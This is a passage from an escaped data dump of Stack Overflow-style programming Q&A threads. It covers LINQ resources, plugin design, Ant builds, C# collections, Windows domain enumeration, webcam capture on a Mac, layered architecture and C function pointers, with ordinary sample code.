overview of Linq. He takes a ground-up approach, first describing all the language features (like Lambda Expressions and Expression Trees) that Linq is built on, and then moving on to some standard linq provider implementations.\\n\\nAdditionally, here\\'s a pretty good MSDN article describing Linq: LINQ: .NET Language-Integrated Query\\n\\nNow, Linq to Sql is a linq provider written specifically for SQL Server. Included in this provider is an OR/M, that gives you some handy-dandy functionality (like typing out all your sql tables, so you get a robust design-time view of your database schema.) It\\'s totally awesome, and for me, has greatly speed up development time when working with a sql database.\\nThe book I recommended above also has a great section about using Linq To Sql. Also,\\nhere\\'s a good \"beginner\\'s guide\" article from MSDN: Linq To SQL: .NET Language-Integrated Query for Relational Data\\n', \"I think this book:\\n\\nC# in Depth\\n\\nBy Jon Skeet is an excellent programmers' guide that matches your exact needs (moving from earlier C# to C#3.5). \\n\\nAlso if you order it you get the electronic copy too - something more publishers should do (excellent for both Kindles and searching).\\n\", 'A bit old but still relevant:\\nhttp://www.developerzen.com/2007/09/17/introduction-to-linq/\\n', \"I recommend the Hooked On LINQ wiki. They've got some great introductory info, as well as more in depth info and samples on all of the operators.\\n\\nI listed a lot of LINQ references in the show notes for Herding Code Episode 10 (on LINQ). One of my favorites is an MSDN Magazine article which explains how LINQ works from a framework perspective in a way which really helped me understand how it works.\\n\", \"From MSDN, here are some papers, written by Anders and others:\\n\\n\\nLINQ: .NET Language-Integrated Query\\nLINQ to SQL: .NET Language-Integrated Query for Relational Data\\n\\n\\nPS after writing this, I see someone has already linked to these, but buried inside a paragraph, so I'll keep them pulled out here in list form as well.\\n\", 'To practice without the need to write wrap code just to execute linq-queries you could use\\nlinqpad.net\\n', \"There's a VB.Net version of the 101 Code Samples page too - \\n\\nhttp://msdn.microsoft.com/en-us/vbasic/bb688088.aspx\\n\", \"I'd strongly suggest you have a play around with LINQPad (http://www.linqpad.net), it's a free tool which allows (umong others things) you to connect to a database server and query it using LINQ to SQL. It takes the pain out of having to set up Console Applications to do the playing.\\n\", 'There is a podcast here (shameless plug) that covers LINQ from one of the authors of LINQ in Action.\\n\\nDeep Fried Bytes - Episode 14: LINQ\\x80\\x99ing the Future of Development with Jim Wooley\\n\\nLots of great stuff in that show that may also help you out.\\n', 'Here is a step by step tutorial on how to incorporate LINQ with your web applications within asp.net. Hope this helps\\nhttp://www.progtalk.com/viewarticle.aspx?articleid=68\\n', 'It may be useful to beginners on linq. The step by step guide with image.\\nhttp://readerstimepass.blogspot.com/2010/11/step-by-step-guide-to-implement-linq-to.html\\n'], ['Is there a general procedure for programming extensibility capability into your code?\\n\\nI am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\\n\\nDo such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?\\n', '\\nFind out what minimum requrements you want to put on a plugin writer. Then make one or more Interfaces that the writer must implement for your code to know when and where to execute the code.  \\nMake an API the writer can use to access some of the functionality in your code.  \\n\\n\\nYou could also make a base class the writer must inherit. This will make wiring up the API easier. Then use some kind of reflection to scan a directory, and load the classes you find that matches your requirements.  \\n\\nSome people also make a scripting language for their system, or implements an interpreter for a subset of an existing language. This is also a possible route to go.\\n\\nBottom line is: When you get the code to load, only your imagination should be able to stop you.\\nGood luck.\\n', \"This is generally something that\\xa0you'll have to expose yourself, so yes, it will be dependent on the language your system is written in (though often it's possible to write wrappers for other languages as well).\\n\\nIf, for example, you had a program written in C, for Windows, plugins would be written for your program as DLLs.  At runtime, you would manually load these DLLs, and expose some interface to them.  For example, the DLLs might expose a gimme_the_interface() function which could accept a structure filled with function pointers.  These function pointers would allow the DLL to make calls, register callbacks, etc.\\n\\nIf you were in C++, you would use the DLL system, except you would probably pass an object pointer instead of a struct, and the object would implement an interface which provided functionality (accomplishing the same thing as the struct, but less ugly).  For Java, you would load class files on-demand instead of DLLs, but the basic idea would be the same.\\n\\nIn all cases, you'll need to define a standard interface between your code and the plugins, so that you can initialize the plugins, and so the plugins can interact with you.\\n\\nP.S. If you'd like to see a good example of a C++ plugin system, check out the foobar2000 SDK.  I haven't used it in quite a while, but it used to be really well done.  I assume it still is.\\n\", \"I've used event-based APIs for plugins in the past. You can insert hooks for plugins by dispatching events and providing access to the application state.\\n\\nFor example, if you were writing a blogging application, you might want to raise an event just before a new post is saved to the database, and provide the post HTML to the plugin to alter as needed.\\n\", \"I'm tempted to point you to the Design Patterns book for this generic question :p\\n\\nSeriously, I think the answer is no. You can't write extensible code by default, it will be both hard to write/extend and awfully inefficient (Mozilla started with the idea of being very extensible, used XPCOM everywhere, and now they realized it was a mistake and started to remove it where it doesn't make sense).\\n\\nwhat makes sense to do is to identify the pieces of your system that can be meaningfully extended and support a proper API for these cases (e.g. language support plug-ins in an editor). You'd use the relevant patterns, but the specific implementation depends on your platform/language choice.\\n\\nIMO, it also helps to use a dynamic language - makes it possible to tweak the core code at run time (when absolutely necessary). I appreciated that Mozilla's extensibility works that way when writing Firefox extensions.\\n\", \"If you are using a compiled language such as C or C++, it may be a good idea to look at plugin support via scripting languages.  Both Python and Lua are excellent languages that are used to script a large number of applications (Civ4 and blender use Python, Supreme Commander uses Lua, etc).  \\n\\nIf you are using C++, check out the boost python library.  Otherwise, python ships with headers that can be used in C, and does a fairly good job documenting the C/python API.  The documentation seemed less complete for Lua, but I may not have been looking hard enough.  Either way, you can offer a fairly solid scripting platform without a terrible amount of work.  It still isn't trivial, but it provides you with a very good base to work from.\\n\", 'I think there are two aspects to your question: \\n\\nThe design of the system to be extendable (the design patterns, inversion of control and other architectural aspects) (http://www.martinfowler.com/articles/injection.html). And, at least to me, yes these patterns/techniques are platform/language independent and can be seen as a \"general procedure\".\\n\\nNow, their implementation is language and platform dependend (for example in C/C++ you have the dynamic library stuff, etc.) \\n\\nSeveral \\'frameworks\\' have been developed to give you a programming environment that provides you pluggability/extensibility but as some other people mention, don\\'t get too crazy making everything pluggable. \\n\\nIn the Java world a good specification to look is OSGi (http://en.wikipedia.org/wiki/OSGi) with several implementations the best one IMHO being Equinox (http://www.eclipse.org/equinox/)\\n'], ['I have a build script and as part of that script it copies a jar file to a directory, for ease lets call it the utils jar.  the utils jar is built by another build script sitting in another directory.  What im trying to do have my build script run the utils build script so that I can ensure the utils jar is up to date.\\n\\nSo I know I need to import the utils build file.\\n\\n&lt;import file=\"../utils/build/build.xml\" /&gt;\\n\\n\\nWhich doesn\\'t work because the import task, unlike almost every other ant taks, doesn\\'t run from basedir, it runs from the pwd.  So to get around that I have this little ditty, which does successfully import the build file\\n\\n  &lt;property name=\"baseDirUpOne\" location=\"..\" /&gt;\\n  &lt;import file=\"${baseDirUpOne}/utils/build/build.xml\" /&gt;\\n\\n\\nSo now that ive solved my import problem I need to call the task, well that should be easy right:\\n\\n&lt;antcall target=\"utils.package\" /&gt;\\n\\n\\nnote that in the above, utils is the project name of ../utils/build/build.xml\\n\\nthe problem I\\'m now running into is that ant call doesn\\'t execute in ../utils/build so what I need, and cant find, is a runat property or something similar, essentially:\\n\\n&lt;antcall target=\"utils.package\" runat=\"../utils/build\" /&gt;\\n\\n\\nThe reason I need this is that in my utils build file the step to select which code to copy to the jar is based on relative paths so as to avoid hardcoding paths in my ant file. Any ideas? \\n', 'I\\'ve got something similar set up: I have a main Ant build.xml which calls a separate build.xml that takes care of building my tests. This is how I do it:\\n\\n&lt;target name=\"build-tests\"&gt;\\n    &lt;subant target=\"build\"&gt;\\n      &lt;fileset dir=\"${test.home}\" includes=\"build.xml\"/&gt;\\n    &lt;/subant&gt;\\n&lt;/target&gt;\\n\\n\\nThe trick is to use subant instead of antcall. You don\\'t have to import the other build file.\\n', 'Try using the \"ant\" task instead of the \"antcall\" task, which runs the imported build directly instead of importing it into the current build file. It has a \"dir\" parameter:\\n\\n\\n  the directory to use as a basedir\\n  for the new Ant project. Defaults to\\n  the current project\\'s basedir, unless\\n  inheritall has been set to false, in\\n  which case it doesn\\'t have a default\\n  value. This will override the basedir\\n  setting of the called project.\\n\\n\\nSo you could do:\\n\\n&lt;ant antfile=\"${baseDirUpOne}/utils/build/build.xml\" dir=\"../utils/build\" /&gt;\\n\\n\\nor something like that.\\n', 'You can pass params down to antcall using  nested in the antcall block.   So, you can pass the properties down that way (probably even basedir since properties are immutable).   \\n'], [\"So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\\n\\npublic class TokenTree\\n{\\n    public TokenTree()\\n    {\\n        /* I must admit to not fully understanding this,\\n         * I got it from msdn. As far as I can tell, IDictionary is an\\n         * interface, and Dictionary is the default implementation of\\n         * that interface, right?\\n         */\\n        SubPairs = new Dictionary&lt;string, string&gt;();\\n    }\\n\\n    public string Key;\\n    public string Value;\\n    public IDictionary&lt;string, string&gt; SubPairs;\\n}\\n\\n\\nIt's only really a simple shunt for passing around data.\\n\", 'There is an actual Data Type called KeyValuePair, use like this\\n\\nKeyValuePair&lt;string, string&gt; myKeyValuePair = new KeyValuePair&lt;string,string&gt;(\"defaultkey\", \"defaultvalue\");\\n\\n', \"Dictionary Class is exactly what you want, correct.\\n\\nYou can declare the field directly as Dictionary, instead of IDictionary, but that's up to you.\\n\", 'There is a KeyValuePair built-in type. As a matter of fact, this is what the IDictionary is giving you access to when you iterate in it.\\n\\nAlso, this structure is hardly a tree, finding a more representative name might be a good exercise.\\n', 'One possible thing you could do is use the Dictionary object straight out of the box and then just extend it with your own modifications:\\n\\npublic class TokenTree : Dictionary&lt;string, string&gt;\\n{\\n    public IDictionary&lt;string, string&gt; SubPairs;\\n}\\n\\n\\nThis gives you the advantage of not having to enforce the rules of IDictionary for your Key (e.g., key uniqueness, etc).\\n\\nAnd yup you got the concept of the constructor right :)\\n', '@Jay Mooney: A generic Dictionary class in .NET is actually a hash table, just with fixed types.\\n\\nThe code you\\'ve shown shouldn\\'t convince anyone to use Hashtable instead of Dictionary, since both code pieces can be used for both types.\\n\\nFor hashtable:\\n\\nforeach(object key in h.keys)\\n{\\n     string keyAsString = key.ToString(); // btw, this is unnecessary\\n     string valAsString = h[key].ToString();\\n\\n     System.Diagnostics.Debug.WriteLine(keyAsString + \" \" + valAsString);\\n}\\n\\n\\nFor dictionary:\\n\\nforeach(string key in d.keys)\\n{\\n     string valAsString = d[key].ToString();\\n\\n     System.Diagnostics.Debug.WriteLine(key + \" \" + valAsString);\\n}\\n\\n\\nAnd just the same for the other one with KeyValuePair, just use the non-generic version for Hashtable, and the generic version for Dictionary.\\n\\nSo it\\'s just as easy both ways, but Hashtable uses Object for both key and value, which means you will box all value types, and you don\\'t have type safety, and Dictionary uses generic types and is thus better.\\n', \"Use something like this:  \\n\\nclass Tree &lt; T &gt; : Dictionary &lt; T, IList&lt; Tree &lt; T &gt; &gt; &gt;  \\n{  \\n}\\n\\n\\nIt's ugly, but I think it will give you what you want. Too bad KeyValuePair is sealed.\\n\", 'Just one thing to add to this (although I do think you have already had your question answered by others). In the interests of extensibility (since we all know it will happen at some point) you may want to check out the Composite Pattern This is ideal for working with \"Tree-Like Structures\"..\\n\\nLike I said, I know you are only expecting one sub-level, but this could really be useful for you if you later need to extend ^_^\\n', 'I think what you might be after (as a literal implementation of you question) is:\\n\\npubic class TokenTree\\n{\\n    public TokenTree()\\n    {\\n        tree = new Dictionary&lt;string, IDictionary&lt;string,string&gt;&gt;();\\n    }\\n\\n    IDictionary&lt;string, IDictionary&lt;string, string&gt;&gt; tree; \\n}\\n\\n\\nYou did actually say a \"list\" of key-values in your question so you might want to swap the inner IDictionary with a:\\n\\nIList&lt;KeyValuePair&lt;string, string&gt;&gt;\\n\\n'], ['When opening Adobe Acrobat Pro, whether it be through Applescript or finder, the introductory dialog is shown.  Is there a way to not show this dialog without already having checked the \"Don\\'t Show Again\" option when opening a document using Applescript?  \\n\\nPhotoshop and Illustrator Applescript libraries have ways of setting interaction levels and not showing dialogs, but I can\\'t seem to find the option in Acrobat.\\n', 'Copy any applicable preferences files in ~/Library/Preferences from a machine that you have checked \"Don\\'t show again\" on.\\n', \"If it's not in the dictionary, probably not.\\n\"], ['Using the Windows API, how can I get a list of domains on my network?\\n', 'Answered my own question:\\n\\nUse the NetServerEnum function, passing in the SV_TYPE_DOMAIN_ENUM constant for the \"servertype\" argument.\\n\\nIn Delphi, the code looks like this:\\n\\n&lt;snip&gt;\\ntype\\n  NET_API_STATUS = DWORD;\\n  PSERVER_INFO_100 = ^SERVER_INFO_100;\\n  SERVER_INFO_100 = packed record\\n    sv100_platform_id : DWORD;\\n    sv100_name        : PWideChar;\\nend;\\n\\nfunction NetServerEnum(  //get a list of pcs on the network (same as DOS cmd \"net view\")\\n  const servername    : PWideChar;\\n  const level         : DWORD;\\n  const bufptr        : Pointer;\\n  const prefmaxlen    : DWORD;\\n  const entriesread   : PDWORD;\\n  const totalentries  : PDWORD;\\n  const servertype    : DWORD;\\n  const domain        : PWideChar;\\n  const resume_handle : PDWORD\\n) : NET_API_STATUS; stdcall; external \\'netapi32.dll\\';\\n\\nfunction NetApiBufferFree(  //memory mgmt routine\\n  const Buffer : Pointer\\n) : NET_API_STATUS; stdcall; external \\'netapi32.dll\\';\\n\\nconst\\n  MAX_PREFERRED_LENGTH = DWORD(-1);\\n  NERR_Success = 0;\\n  SV_TYPE_ALL  = $FFFFFFFF;\\n  SV_TYPE_DOMAIN_ENUM = $80000000;\\n\\n\\nfunction TNetwork.ComputersInDomain: TStringList;\\nvar\\n  pBuffer        : PSERVER_INFO_100;\\n  pWork          : PSERVER_INFO_100;\\n  dwEntriesRead  : DWORD;\\n  dwTotalEntries : DWORD;\\n  i              : integer;\\n  dwResult       : NET_API_STATUS;\\nbegin\\n  Result := TStringList.Create;\\n  Result.Clear;\\n\\n  dwResult := NetServerEnum(nil,100,@pBuffer,MAX_PREFERRED_LENGTH,\\n                            @dwEntriesRead,@dwTotalEntries,SV_TYPE_DOMAIN_ENUM,\\n                            PWideChar(FDomainName),nil);\\n\\n  if dwResult = NERR_SUCCESS then begin\\n    try\\n      pWork := pBuffer;\\n      for i := 1 to dwEntriesRead do begin\\n        Result.Add(pWork.sv100_name);\\n        inc(pWork);\\n      end;  //for i\\n    finally\\n      NetApiBufferFree(pBuffer);\\n    end;  //try-finally\\n  end  //if no error\\n  else begin\\n    raise Exception.Create(\\'Error while retrieving computer list from domain \\' +\\n                           FDomainName + #13#10 +\\n                           SysErrorMessage(dwResult));\\n  end;\\nend;\\n&lt;snip&gt;\\n\\n', 'You will need to use some LDAP queries\\n\\nHere is some code I have used in a previous script (it was taken off the net somewhere, and I\\'ve left in the copyright notices)\\n\\n\\' This VBScript code gets the list of the domains contained in the \\n\\' forest that the user running the script is logged into\\n\\n\\' ---------------------------------------------------------------\\n\\' From the book \"Active Directory Cookbook\" by Robbie Allen\\n\\' Publisher: O\\'Reilly and Associates\\n\\' ISBN: 0-596-00466-4\\n\\' Book web site: http://rallenhome.com/books/adcookbook/code.html\\n\\' ---------------------------------------------------------------\\n\\nset objRootDSE = GetObject(\"LDAP://RootDSE\")\\nstrADsPath =  \"&lt;GC://\" &amp; objRootDSE.Get(\"rootDomainNamingContext\") &amp; \"&gt;;\"\\nstrFilter  = \"(objectcategory=domainDNS);\"\\nstrAttrs   = \"name;\"\\nstrScope   = \"SubTree\"\\n\\nset objConn = CreateObject(\"ADODB.Connection\")\\nobjConn.Provider = \"ADsDSOObject\"\\nobjConn.Open \"Active Directory Provider\"\\nset objRS = objConn.Execute(strADsPath &amp; strFilter &amp; strAttrs &amp; strScope)\\nobjRS.MoveFirst\\nwhile Not objRS.EOF\\n    Wscript.Echo objRS.Fields(0).Value\\n    objRS.MoveNext\\nwend\\n\\n\\n\\n\\nAlso a C# version\\n'], [\"With VMWare Server running under Linux (Debain), I would like to have the following setup:\\n\\n\\n1st: NIC being used by many of the\\nimages running under VMWare, as well\\nas being used by the Linux OS \\n2nd: NIC being used by only 1 image and to be unused by the Linux OS (as its part of a DMZ)\\n\\n\\nAlthough the second NIC won't be used by Linux, it is certainly recognised as a NIC (e.g. eth1).\\n\\nIs this possible under VMWare Server, and if so, is it as simple as not binding eth1 under Linux and then bridging it to the image under VMWare Server?\\n\", \"I believe you can set the desired solution up by rerunning the vmware configuration script.  And doing a custom network setup, so that both NIC's are mapped to your vmware instance.  I would recommend making eth0 the 2nd NIC since it will be easier for Linux to use by default.  Then make eth1 the 1st NIC.\\n\"], ['We have a SharePoint WSS site and some of our users on on the Mac OSX platform.  Are there any tips or tricks to get a similar experience to Windows with document shares and calendars on the Mac?\\n\\nEdit: Browsing a SharePoint WSS site on a Mac, whether using Firefox or Safari, has a very similar look and feel as it does on Windows IE.  The similar experience I am looking for has to do with integrating the calendars, document shares, etc. into the desktop.\\n\\nFor example, with IE you can go to a calendar and select \"Actions -> Connect to Outlook\" and it will make the calendar visible and manageable from within Outlook.\\n\\nIs there any way to get the Mac to work similarly?\\n', 'Unfortunately, the \"full\" Sharepoint Experience is limited to running Internet Explorer 6/7 and Office 2007.\\n\\nOn the Mac, I recommend using Firefox (Camino?) which seems to work a bit better than Safari.\\n\\nEdit: When you say \"Similar experience\", what exactly are you missing? I don\\'t have any Mac here, but I was under the impression that Office 2008 will have a working integration with Sharepoint as well.\\n', 'Office 2008 allows limited connectivity to MOSS. However there is no Mac OS browser yet that is completely compatible to MOSS.\\n\\nI do have it on good authority the Microsoft Mac BU team is working with the MOSS team to see this changing in future versions of the platform, specifically around the Safari support.\\n', 'ActiveX is used to enable the bridge between MOSS and Office, and as ActiveX is only on Windows, you will find that you cannot get the full experience if you do not use Windows as your OS.\\n', 'Yes, Sharepoint looks to client installs of Office applications and Active X in order to fully integrate.\\n'], ['Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well? \\n', 'I don\\'t have a Mac here, but there is some Documentation up here:\\n\\nhttp://developer.apple.com/documentation/Hardware/Conceptual/iSightProgGuide/01introduction/chapter_1_section_1.html\\n\\nIt looks like you have to go through the QuickTime API. There is supposed to be a Sample Project called \"MungGrab\" which could be worth a look according to this thread.\\n', \"Aside from ObjC, you can use the PyObjC or RubyCocoa bindings to access it also. If you're not picky about which language, I'd say use Ruby, as PyObjC is horribly badly documented (even the official Apple page on it refers to the old version, not the one that came with OS X Leopard)\\n\\nQuartz Composer is probably the easiest way to access it, and .quartz files can be embed in applications pretty easily (and the data piped out to ObjC or such)\\n\\nAlso, I suppose there should be an example or two of this in the /Developer/Examples/\\n\", \"There's a command line utility called isightcapture that does more or less what you want to do. You could probably get the code from the developer (his e-mail address is in the readme you get when you download the utility).\\n\", 'You should check out the QTKit Capture documentation.\\n\\nOn Leopard, you can get at all of it over the RubyCocoa bridge:\\n\\nrequire \\'osx/cocoa\\'\\nOSX.require_framework(\"/System/Library/Frameworks/QTKit.framework\")\\n\\nOSX::QTCaptureDevice.inputDevices.each do |device|\\n    puts device.localizedDisplayName\\nend\\n\\n', \"If you poke around Apple's mailing lists you can find some code to do it in Java as well. Here's a simple example suitable for capturing individual frames, and here's a more complicated one that's fast enough to display live video.\\n\", \"One thing that hasn't been mentioned so far is the IKPictureTaker, which is part of Image Kit.  This will come up with the standard OS provided panel to take pictures though, with all the possible filter functionality etc. included.  I'm not sure if that's what you want.\\n\\nI suppose you can use it from other languages as well, considering there are things like cocoa bridges but I have no experience with them.\\n\\nGoogling also came up with another question on stackoverflow that seems to address this issue.\\n\", \"From a related question which specifically asked the solution to be pythonic, you should give a try to motmot's camiface library from Andrew Straw. It also works with firewire cameras, but it works also with the isight, which is what you are looking for.\\n\\nFrom the tutorial:\\n\\nimport motmot.cam_iface.cam_iface_ctypes as cam_iface\\nimport numpy as np\\n\\nmode_num = 0\\ndevice_num = 0\\nnum_buffers = 32\\n\\ncam = cam_iface.Camera(device_num,num_buffers,mode_num)\\ncam.start_camera()\\nframe = np.asarray(cam.grab_next_frame_blocking())\\nprint 'grabbed frame with shape %s'%(frame.shape,)\\n\\n\", 'Well, if you really hate ObjectiveC, Swift is quite a nice language too.\\n\\nQTKit is deprecated since X.7, use AV Foundation for modern Swift and ObjectiveC apps on OS X.\\nhttps://developer.apple.com/library/mac/technotes/tn2300/_index.html\\n\\nSpecifically, for OS X.7 and newer, image capture is done by enumerating cameras and such using [AVCaptureDevice devices], then creating an AVCaptureSession, setting up streams: [AVCaptureDeviceInput deviceInputWithDevice: ...] and \\n  [ addOutput: ...], then finally [ startRunning].\\n\\nhttps://developer.apple.com/library/mac/documentation/AVFoundation/Reference/AVCaptureSession_Class/\\n\\nhttps://developer.apple.com/library/mac/technotes/tn2300/_index.html#//apple_ref/doc/uid/DTS40012852-CH1-MEDIA_CAPTURE_AND_ACCESS_TO_CAMERA\\n'], ['Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \\n\\nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\\n\\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \\n\\nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\\n\\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers? \\n', 'I always create a separate assembly that contains:  \\n\\n\\nA lot of small Interfaces (think ICreateRepository, IReadRepository, IReadListRepsitory.. the list goes on and most of them relies heavily on generics)  \\nA lot of concrete Interfaces, like an IPersonRepository, that inherits from IReadRepository, you get the point..\\nAnything you cannot describe with just the smaller interfaces, you put into the concrete interface.\\nAs long as you use the IPersonRepository to declare your object, you get a clean, consistent interface to work with. But the kicker is, you can also make a class that takes f.x. a ICreateRepository in its constructor, so the code will end up being very easy to do some really funky stuff with. There are also interfaces for the Services in the business tier here.\\nAt last i stick all the domain objects into the extra assembly, just to make the code base itself a bit cleaner and more loosely coupled. These objects dont have any logic, they are just a common way to describe the data for all 3+ layers.\\n\\n\\nBtw. Why would you define methods in the business logic tier to accommodate the data tier?\\nThe data tier should have no reason to even know there is a business tier..\\n', 'It could be a solution, as it would not erode the interface. I guess you could have a class like this:\\n\\npublic class BusinessObjectRecord : BusinessObject\\n{\\n}\\n\\n', 'What do you mean by that the data tier should not be aware of the business logic tier? How would you fill an business object with data?\\n\\nI often do this:\\n\\nnamespace Data\\n{\\n    public class BusinessObjectDataManager\\n    {\\n         public void SaveObject(BusinessObject object)\\n         {\\n                // Exec stored procedure\\n         {\\n    }\\n}\\n\\n', \"This is a classic problem - separating your domain model from your database model. There are several ways to attack it, it really depends on the size of your project in my opinion. You could use the repository pattern as others have said. If you are using .net or java you could use NHibernate or Hibernate. \\n\\nWhat I do is use Test Driven Development so I write my UI and Model layers first and the Data layer is mocked, so the UI and model is build around domain specific objects, then later I map these object to what ever technology I'm using the the Data Layer. Is a very bad idea to let the database determine the design of your app, write the app first and think about the data later.\\n\\nps the title of the question is a little mis-leading\\n\", '@Ice^^Heat:\\n\\n\\n  What do you mean by that the data tier should not be aware of the business logic tier? How would you fill an business object with data?\\n\\n\\nThe UI asks the ServiceClass in the business tier for a service, namely getting a list of objects filtered by an object with the needed parameter data.\\nThen the ServiceClass creates an instance of one of the repository classes in the data tier, and calls the GetList(ParameterType filters).\\nThen the data tier accesses the database, pulls up the data, and maps it to the common format defined in the \"domain\" assembly.\\nThe BL has no more work to do with this data, so it outputs it to the UI.\\n\\nThen the UI wants to edit Item X. It sends the item (or business object) to the service in the Business Tier. The business tier validates the object, and if it is OK, it sends it to the data tier for storage.\\n\\nThe UI knows the service in the business tier which again knows about the data tier.\\n\\nThe UI is responsible for mapping the users data input to and from the objects, and the data tier is responsible for mapping the data in the db to and from the objects. The Business tier stays purely business. :)\\n', \"So the problem is that the business layer needs to expose more functionality to the data layer, and adding this functionality means exposing too much to the UI layer?  If I'm understanding your problem correctly, it sounds like you're trying to satisfy too much with a single interface, and that's just causing it to become cluttered.  Why not have two interfaces into the business layer?  One would be a simple, safe interface for the UI layer.  The other would be a lower-level interface for the data layer.\\n\\nYou can apply this two-interface approach to any objects which need to be passed to both the UI and the data layers, too.\\n\\npublic class BusinessLayer : ISimpleBusiness\\n{}\\n\\npublic class Some3LayerObject : ISimpleSome3LayerObject\\n{}\\n\\n\", 'You may want to split your interfaces into two types, namely:\\n\\n\\nView interfaces -- which are interfaces that specify your interactions with your UI, and\\nData interfaces -- which are interfaces that will allow you to specify interactions with your data\\n\\n\\nIt is possible to inherit and implement both set of interfaces such that:\\n\\npublic class BusinessObject : IView, IData\\n\\n\\nThis way, in your data layer you only need to see the interface implementation of IData, while in your UI you only need to see the interface implementation of IView.\\n\\nAnother strategy you might want to use is to compose your objects in the UI or Data layers such that they are merely consumed by these layers, e.g.,\\n\\npublic class BusinessObject : DomainObject\\n\\npublic class ViewManager&lt;T&gt; where T : DomainObject\\n\\npublic class DataManager&lt;T&gt; where T : DomainObject\\n\\n\\nThis in turn allows your business object to remain ignorant of both the UI/View layer and the data layer.\\n', 'If I understand the question correctly, you\\'ve created a domain model and you would like to write an object-relational mapper to map between records in your database and your domain objects. However, you\\'re concerned about polluting your domain model with the \\'plumbing\\' code that would be necessary to read and write to your object\\'s fields.\\n\\nTaking a step back, you essentially have two choices of where to put your data mapping code - within the domain class itself or in an external mapping class.\\nThe first option is often called the Active Record pattern and has the advantage that each object knows how to persist itself and has sufficient access to its internal structure to allow it to perform the mapping without needing to expose non-business related fields.\\n\\nE.g\\n\\npublic class User\\n{\\n\\tprivate string name;\\n\\tprivate AccountStatus status;\\n\\n\\tprivate User()\\n\\t{\\n\\t}\\n\\n\\tpublic string Name\\n\\t{\\n\\t\\tget { return name; }\\n\\t\\tset { name = value; }\\n\\t}\\n\\n\\tpublic AccountStatus Status\\n\\t{\\n\\t\\tget { return status; }\\n\\t}\\n\\n\\tpublic void Activate()\\n\\t{\\n\\t\\tstatus = AccountStatus.Active;\\n\\t}\\n\\n\\tpublic void Suspend()\\n\\t{\\n\\t\\tstatus = AccountStatus.Suspended;\\n\\t}\\n\\n\\tpublic static User GetById(int id)\\n\\t{\\n\\t\\tUser fetchedUser = new User();\\n\\n\\t\\t// Lots of database and error-checking code\\n\\t\\t// omitted for clarity\\n\\t\\t// ...\\n\\n\\t\\tfetchedUser.name = (string) reader[\"Name\"];\\n\\t\\tfetchedUser.status = (int)reader[\"statusCode\"] == 0 ? AccountStatus.Suspended : AccountStatus.Active;\\n\\n\\t\\treturn fetchedUser;\\n\\t}\\n\\n\\tpublic static void Save(User user)\\n\\t{\\n\\t\\t// Code to save User\\'s internal structure to database\\n\\t\\t// ...\\n\\t}\\n}\\n\\n\\nIn this example, we have an object that represents a User with a Name and an AccountStatus. We don\\'t want to allow the Status to be set directly, perhaps because we want to check that the change is a valid status transition, so we don\\'t have a setter. Fortunately, the mapping code in the GetById and Save static methods have full access to the object\\'s name and status fields.\\n\\nThe second option is to have a second class that is responsible for the mapping. This has the advantage of seperating out the different concerns of business logic and persistence which can allow your design to be more testable and flexible. The challenge with this method is how to expose the name and status fields to the external class. Some options are:\\n  1. Use reflection (which has no qualms about digging deep into your object\\'s private parts)\\n  2. Provide specially-named, public setters (e.g. prefix them with the word \\'Private\\') and hope no one uses them accidentally\\n  3. If your language suports it, make the setters internal but grant your data mapper module access. E.g. use the InternalsVisibleToAttribute in .NET 2.0 onwards or friend functions in C++\\n\\nFor more information, I\\'d recommend Martin Fowler\\'s classic book \\'Patterns of Enterprise Architecture\\'\\n\\nHowever, as a word of warning, before going down the path of writing your own mappers I\\'d strongly recommend looking at using a 3rd-party object relational mapper (ORM) tool such as nHibernate or Microsoft\\'s Entity Framework. I\\'ve worked on four different projects where, for various reasons, we wrote our own mapper and it is very easy to waste a lot of time maintaining and extending the mapper instead of writing code that provides end user value. I\\'ve used nHibernate on one project so far and, although it has quite a steep learning curve initially, the investment you put in early on pays off considerably.\\n', 'I\\'m going to continue my habit of going against the grain and say that you should question why you are building all these horribly complex object layers.\\n\\nI think many developers think of the database as a simple persistence layer for their objects, and are only concerned with the CRUD operations that those objects need.  Too much effort is being put into the \"impedence mismatch\" between object and relational models.  Here\\'s an idea: stop trying.\\n\\nWrite stored procedures to encapsulate your data.  Use results sets, DataSet, DataTable, SqlCommand (or the java/php/whatever equivalent) as needed from code to interact with the database.  You don\\'t need those objects.  An excellent example is embedding a SqlDataSource into a .ASPX page.\\n\\nYou shouldn\\'t try to hide your data from anyone.  Developers need to understand exactly how and when they are interacting with the physical data store.\\n\\nObject-relational mappers are the devil.  Stop using them.\\n\\nBuilding enterprise applications is often an exercise in managing complexity.  You have to keep things as simple as possible, or you will have an absolutely un-maintainable system.  If you are willing to allow some coupling (which is inherent in any application anyway), you can do away with both your business logic layer and your data access layer (replacing them with stored procedures), and you won\\'t need any of those interfaces.\\n'], ['I want to create a function that performs a function passed by parameter on a set of data. How do you pass a function as a parameter in C?\\n', \"You need to pass a function pointer.  The syntax is a little cumbersome, but it's really powerful once you get familiar with it.\\n\", 'Declaration\\n\\nA prototype for a function which takes a function parameter looks like the following:\\n\\nvoid func ( void (*f)(int) );\\n\\n\\nThis states that the parameter f will be a pointer to a function which has a void return type and which takes a single int parameter. The following function (print) is an example of a function which could be passed to func as a parameter because it is the proper type:\\n\\nvoid print ( int x ) {\\n  printf(\"%d\\\\n\", x);\\n}\\n\\n\\nFunction Call\\n\\nWhen calling a function with a function parameter, the value passed must be a pointer to a function. Use the function\\'s name (without 